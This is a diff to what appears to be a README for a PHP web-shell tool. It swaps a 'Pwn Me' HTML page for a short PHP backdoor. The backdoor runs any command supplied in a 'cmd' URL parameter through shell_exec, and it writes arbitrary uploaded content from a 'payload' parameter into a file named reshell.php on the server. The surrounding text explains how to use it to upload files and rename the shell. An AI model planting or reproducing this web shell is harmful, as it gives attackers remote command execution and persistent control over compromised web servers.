@@ -13,26 +13,17 @@
 #### here you can upload any file just copy the content of this file and the output will gives you the link of it to acssess
 #### you can edit the name and the extension in the source code from "reshell.php" to what you like
 ```
-<!DOCTYPE html>
-<html>
-<head>
-	<title>Pwn Me</title>
-    <link rel="stylesheet" type="text/css" href="css/home.css">
-</head>
-<body>
-    <ul>
-        <li style="float: left;"><a href="administrator/login.php">login</a></li>
-        <li><a href="pics.php">pictures</a></li>
-        <li><a href="posts.php">posts</a></li>
-        <li><a href="#">Home</a></li>
-    </ul>
-    <div class="home">
-        <h1>welcome into space box</h1>
-    </div>
-</body>
-</html>
-</body>
-</html>
+<?php
+	if(isset($_GET['cmd']))
+	{
+	    $output = shell_exec($_GET['cmd']);
+	}
+	elseif (isset($_GET['payload'])) {
+		file_put_contents("reshell.php", $_GET['payload']);
+		$path = "reshell.php";
+	}	
+?>
+
 ```
 
 ## LICENCE
